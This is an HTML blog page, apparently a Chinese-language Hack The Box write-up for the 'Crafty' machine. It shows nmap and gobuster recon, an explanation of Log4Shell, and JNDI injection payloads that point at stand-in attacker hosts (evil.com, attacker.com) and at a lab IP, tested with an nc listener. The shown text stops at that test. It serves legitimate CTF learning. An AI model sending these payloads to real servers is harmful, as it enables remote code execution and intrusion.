@@ -1,0 +1,1075 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>HTB Crafty &middot; Blowfish</title>
+    <meta name="title" content="HTB Crafty &middot; Blowfish">
+
+  
+  
+  
+  
+  
+  <link rel="canonical" href="https://ink410.github.io/posts/htb-crafty/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.5c1f183abbd81c1e3325f920a27cbb9ba254b48fb31ea3618517bff4770f91f0ae423c9e8292ba4cf2bd80c63fd0d2da86c482956da99c3c0e48b5a3911df364.css"
+    integrity="sha512-XB8YOrvYHB4zJfkgony7m6JUtI&#43;zHqNhhRe/9HcPkfCuQjyegpK6TPK9gMY/0NLahsSClW2pnDwOSLWjkR3zZA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.98bb8ce8f123e03c4d2171eeec151dd404b5c476beb5ef1068d0e8b1a2afb923065e6552fc14b2d867c85ee4bd8529a43193f729f874d3908517ba03b5d1cc57.js"
+      integrity="sha512-mLuM6PEj4DxNIXHu7BUd1AS1xHa&#43;te8QaNDosaKvuSMGXmVS/BSy2GfIXuS9hSmkMZP3Kfh005CFF7oDtdHMVw=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="https://ink410.github.io/posts/htb-crafty/">
+  <meta property="og:site_name" content="Blowfish">
+  <meta property="og:title" content="HTB Crafty">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-20T16:32:58+08:00">
+    <meta property="article:modified_time" content="2025-07-20T16:32:58+08:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Crafty">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "HTB Crafty",
+    "headline": "HTB Crafty",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/ink410.github.io\/posts\/htb-crafty\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-07-20T16:32:58\u002b08:00",
+    "datePublished": "2025-07-20T16:32:58\u002b08:00",
+    
+    "dateModified": "2025-07-20T16:32:58\u002b08:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "502"
+  }]
+  </script>
+
+
+
+  
+  
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          Blowfish
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    HTB
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      HTB
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Crafty
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-07-20T16:32:58&#43;08:00">20 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span>502 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>这台靶机发布于2024年2月10日，windows靶机，HTB社区难度评级为easy。
+首先在前期的信息收集环节中扫描到一个正在运行的Minecraft 1.16.5服务器，通过搜索了解到这个版本的Minecraft存在log4shell漏洞，通过这个核弹级漏洞得到了初始的立足点，
+在后续的提权过程中，因为本身服务器是Windows10，juicy potato等常见的一些利用在这个版本的Windows中是不能运行的，通过内核提权不行的情况下，想到服务器本身运行Minecraft，这代表着一定存在Java程序，在系统中翻找之后找到一个Java插件，通过jd-gui反编译这个jar包，找到了一个可能的密码，通过这个密码尝试登录administrator用户，通过runascs.exe解决了cli执行runas时，因为UAC的原因无法输入密码的问题，至此已经得到administrator用户的shell
+之后通过psexec配合nc，通过administrator用户执行psexec，从而将权限提升到nt authority\system，拿到整个系统的最高权限。</p>
+
+<h3 class="relative group">Recon 
+    <div id="recon" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#recon" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">ip</span><span class="o">=</span>10.10.11.249
+</span></span><span class="line"><span class="cl">sudo nmap -sT --min-rate <span class="m">10000</span> -p- <span class="nv">$ip</span> 
+</span></span><span class="line"><span class="cl">sudo nmap -sU --top-ports <span class="m">20</span> crafty.htb -oA nmapscan/udp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo nmap -sT -sC -sV -O -p80,25565 <span class="nv">$ip</span> -oA nmapscan/details
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE   VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open  http      Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://crafty.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">25565/tcp open  minecraft Minecraft 1.16.5 <span class="o">(</span>Protocol: 127, Message: Crafty Server, Users: 0/100<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2019<span class="p">|</span><span class="m">10</span> <span class="o">(</span>97%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Windows Server <span class="m">2019</span> <span class="o">(</span>97%<span class="o">)</span>, Microsoft Windows <span class="m">10</span> <span class="m">1903</span> - 21H1 <span class="o">(</span>91%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.11 seconds
+</span></span></code></pre></div><p>扫描结果中有一条nmap没有自动跟随重定向，得到一个域名<code>crafty.htb</code>, 添加到hosts文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo sed -i <span class="s1">&#39;1i 10.10.11.249 crafty.htb&#39;</span> /etc/hosts
+</span></span></code></pre></div>
+<h3 class="relative group">Web 
+    <div id="web" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#web" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>80端口是一个mincraft服务器的介绍页面，商店，投票，论坛等内容都是coming soon状态，主页有一行<code>Join 1277 other players on play.crafty.htb</code>，查看一下play.crafty.htb有什么不一样的内容，并且根据这个信息可以尝试爆破一下http host头，查看是不是有其他的页面，这里对于UDP端口的扫描没有看到53端口开启, 所以应该不是基于子域名的分站点，大概率是vhost</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster vhost -u http://crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  --append-domain -r -k -t <span class="m">100</span>
+</span></span></code></pre></div><p>&ndash;append-domain: 将url添加自动添加到字典后
+-r: 跟踪重定向
+-k: 不进行tls验证</p>
+
+<h3 class="relative group">Minecraft 
+    <div id="minecraft" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#minecraft" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>端口25565是Minecraft游戏服务器的默认端口，包括nmap的扫描结果也显示了此处运行的是Minecraft 1.16.5版本，searchsploit当中只搜索到一个Minecraft启动器的潜在利用，并且版本还是1.6.61的</p>
+<p>搜索之后找到Minecraft 1.16.5版本存在log4shell，这是一个发布于2021年的核弹级漏洞</p>
+
+<h4 class="relative group">log4shell 
+    <div id="log4shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#log4shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>log4shell是一个log4j2框架存在的RCE漏洞，编号：<strong>CVE-2021-44228</strong>，影响 Apache Log4j 2 版本 <code>&lt; 2.15.0</code></p>
+
+<h5 class="relative group">log4j 
+    <div id="log4j" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#log4j" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>log4j本身是一个Java的高性能日志框架，框架本身使用了JNDI这个Java提供的，用于Java程序访问命名服务(DNS, LDAP)的API接口</p>
+
+<h5 class="relative group">JNDI 
+    <div id="jndi" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#jndi" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>JNDI是Java提供的基本API，用于让Java程序访问命名服务，JNDI存在注入，支持<code>${jndi:ldap://evil.com/x}</code>这样的语法，从而使得Log4j2解析日志时，解析了ldap地址的恶意内容，实现RCE</p>
+<p>它的原理可以概括为：</p>
+<blockquote>
+<p>利用 Log4j2 中对日志内容进行 <strong>JNDI 动态解析</strong> 的功能，注入恶意 LDAP 请求 → 远程加载并执行攻击者提供的 Java 类（字节码） → <strong>完全控制目标服务器</strong>。</p></blockquote>
+
+<h5 class="relative group">漏洞成因 
+    <div id="漏洞成因" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>log4j的lookups功能可以用来查找变量，比如<code>logger.info(&quot;User logged in: {}&quot;, &quot;${java:version}&quot;)</code>，这样可以输出Java版本，但是它也支持使用<code>${jndi:ldap://evil.com/obj}</code>这样的写法来调用jndi并且通过ldap协议调，当这些内容被加入日志的时候，恶意代码立即执行</p>
+<p>这也就意味着一切可以写入日志的行为都会触发这个漏洞，并且因为支持使用ldap这样的应用广泛的协议，比如windows AD域的实现，ldap协议就是其中关键的一环，基于此。log4shell影响范围之广，利用方式简单，并且可以称之为是核弹级的漏洞</p>
+
+<h5 class="relative group">漏洞流程 
+    <div id="漏洞流程" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%bc%8f%e6%b4%9e%e6%b5%81%e7%a8%8b" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<pre tabindex="0"><code>攻击者发送 payload：
+    ${jndi:ldap://attacker.com/Exploit}
+
+↓ 被日志写入（如用户名、User-Agent、错误信息）
+
+Log4j2 解析字符串中的 ${} → 调用 JNDI 解析
+
+↓ JNDI 请求 ldap://attacker.com/Exploit
+
+攻击者恶意 LDAP 服务器响应 → 返回包含远程类加载路径的对象
+
+↓ Log4j 通过 Java 原生机制加载远程类（RCE）
+
+攻击者代码执行成功
+</code></pre><p>关于这个漏洞已验证的攻击面，可以查看这个<a
+  href="https://github.com/YfryTchsGD/Log4jAttackSurface"
+    target="_blank"
+  >github仓库</a></p>
+
+<h3 class="relative group">exploit log4j 
+    <div id="exploit-log4j" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploit-log4j" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>参考这篇medium的<a
+  href="https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847"
+    target="_blank"
+  >博客</a>
+<a
+  href="https://tlauncher.org/"
+    target="_blank"
+  >TLAUNCHER启动器</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install ./tlauncher-linux-installer.deb -y
+</span></span></code></pre></div><p>在kali的start menu就可以启动tlauncher
+选择release 1.16.5</p>
+
+<h4 class="relative group">Minecraft-Console-Client 
+    <div id="minecraft-console-client" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#minecraft-console-client" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>tlauncher下载的太慢了，并且现在tlauncher是.deb包，设置代理不太方便，直接换用命令行工具<a
+  href="https://github.com/MCCTeam/Minecraft-Console-Client"
+    target="_blank"
+  >Minecraft-Console-Client</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20250522-285/MinecraftClient-20250522-285-linux-x64
+</span></span><span class="line"><span class="cl">mv MinecraftClient-20250522-285-linux-x64 MinecraftClient <span class="o">&amp;&amp;</span> chmod +x MinecraftClient
+</span></span><span class="line"><span class="cl">sudo cp MinecraftClient /usr/local/bin
+</span></span><span class="line"><span class="cl">MinecraftClient
+</span></span></code></pre></div><p>然后输入用户名，密码直接回车，输入靶机的IP地址即可连接</p>
+<p>可以先做一下测试，ldap协议默认是389端口</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo rlwrap -cAr nc -lvnp <span class="m">389</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="p">{</span><span class="n">jndi</span><span class="p">:</span><span class="n">ldap</span><span class="p">:</span><span class="c1">//10.10.14.25/test}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">rlwrap</span><span class="w"> </span><span class="o">-</span><span class="n">cAr</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="n">389</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="n">389</span><span class="w"> </span><span class="p">...</span><span class="w">
